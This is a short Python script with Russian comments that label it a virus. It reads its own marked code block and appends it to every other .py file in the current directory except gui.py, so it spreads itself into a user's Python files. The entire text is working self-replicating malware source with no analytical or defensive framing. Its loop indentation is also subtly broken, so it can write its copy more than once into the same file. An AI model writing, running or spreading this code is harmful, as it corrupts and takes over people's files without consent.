# Начало вируса
import sys, glob, re
 
# Копия вируса
viruscode = []
thisfile = sys.argv[0]
virusfile = open(thisfile, 'r')
lines = virusfile.readlines()
virusfile.close()
inVirus = False
for line in lines:
    if (re.search('^# Начало вируса', line)):
        inVirus = True 
    if (inVirus):
        viruscode.append(line)
    if (re.search('^# Конец вируса', line)):
        break
    programs = glob.glob("*.py")
for p in programs:
    if p != "gui.py":
    	file = open(p, "r")
    	programcode = file.readlines()
    	file.close() 
    	infected = False
    	for line in programcode:
            if ('# Начало вируса' in line):
                infected = True
                break
            if not infected:
            	newcode = []
            	newcode.extend(programcode)
            	newcode.extend(viruscode)
            	file = open(p, "w")
            	file.writelines(newcode)
            	file.close()
# Конец вируса
